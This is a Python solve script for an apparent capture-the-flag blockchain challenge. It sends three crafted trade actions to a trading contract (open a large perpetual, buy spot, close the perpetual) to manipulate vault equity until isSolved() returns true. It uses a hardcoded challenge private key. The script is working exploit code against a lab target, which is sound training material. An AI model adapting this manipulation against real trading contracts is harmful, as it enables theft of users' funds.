#!/usr/bin/env python3

import os
import sys

from eth_abi import encode
from eth_account import Account
from eth_utils import keccak
from web3 import Web3


RPC_URL = os.environ.get(
    "RPC_URL", "https://glomma-river-trading-rpc-8c8601f0ae18.chall.nnsc.tf"
)
PRIVATE_KEY = os.environ.get(
    "PRIVATE_KEY",
    "0xc3067d43ae42e864bdf30d9a11419edecaec3a5b131efa4f09e6b61bd1c44c75",
)
SETUP_ADDRESS = os.environ.get(
    "SETUP_ADDRESS", "0xF37B4Fe9c1bC305F44b6BFb9A6dB469e81a8e3AF"
)
CORE_ADDRESS = os.environ.get(
    "CORE_ADDRESS", "0x3333333333333333333333333333333333333333"
)

OPEN_SIZE = 11_278_772_493_901
SPOT_SIZE = 85_000_000_000
IOC_TIF = 3


def selector(signature: str) -> bytes:
    return keccak(text=signature)[:4]


def call_uint(w3: Web3, address: str, signature: str) -> int:
    result = w3.eth.call(
        {"to": Web3.to_checksum_address(address), "data": "0x" + selector(signature).hex()}
    )
    return int.from_bytes(result, "big")


def encode_action(asset: int, is_buy: bool, size: int, reduce_only: bool) -> bytes:
    action = b"\x01\x00\x00\x01" + encode(
        ["uint32", "bool", "uint64", "uint64", "bool", "uint8", "uint128"],
        [asset, is_buy, 0, size, reduce_only, IOC_TIF, 0],
    )
    if len(action) != 228:
        raise ValueError(f"unexpected action length: {len(action)}")
    return selector("sendRawAction(bytes)") + encode(["bytes"], [action])


def send_tx(w3: Web3, account: Account, data: bytes) -> str:
    sender = account.address
    tx = {
        "from": sender,
        "to": Web3.to_checksum_address(CORE_ADDRESS),
        "nonce": w3.eth.get_transaction_count(sender),
        "data": data,
        "value": 0,
        "chainId": w3.eth.chain_id,
    }
    tx["gas"] = w3.eth.estimate_gas(tx) + 50_000
    latest = w3.eth.get_block("latest")
    base_fee = latest.get("baseFeePerGas", 0)
    tx["maxPriorityFeePerGas"] = w3.to_wei(1, "gwei")
    tx["maxFeePerGas"] = base_fee * 2 + tx["maxPriorityFeePerGas"]
    tx["type"] = 2

    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
    if receipt.status != 1:
        raise RuntimeError(f"transaction reverted: {tx_hash.hex()}")
    return tx_hash.hex()


def main() -> int:
    w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 30}))
    if not w3.is_connected():
        print("RPC connection failed", file=sys.stderr)
        return 1

    account = Account.from_key(PRIVATE_KEY)
    is_solved_before = call_uint(w3, SETUP_ADDRESS, "isSolved()")
    print(f"sender      : {account.address}")
    print(f"chain id    : {w3.eth.chain_id}")
    print(f"isSolved    : {bool(is_solved_before)}")

    if is_solved_before:
        print("instance already solved, nothing to do")
        return 0

    steps = [
        ("open perp", encode_action(1, True, OPEN_SIZE, False)),
        ("buy spot", encode_action(10001, True, SPOT_SIZE, False)),
        ("close perp", encode_action(1, False, OPEN_SIZE, True)),
    ]

    for label, calldata in steps:
        tx_hash = send_tx(w3, account, calldata)
        print(f"{label:10}: {tx_hash}")

    collateral = call_uint(w3, CORE_ADDRESS, "collateral()")
    vault_equity = call_uint(w3, CORE_ADDRESS, "vaultEquity()")
    is_solved_after = call_uint(w3, SETUP_ADDRESS, "isSolved()")
    print(f"collateral  : {collateral}")
    print(f"vaultEquity : {vault_equity}")
    print(f"isSolved    : {bool(is_solved_after)}")

    if not is_solved_after:
        print("solve sequence finished but challenge is not solved", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
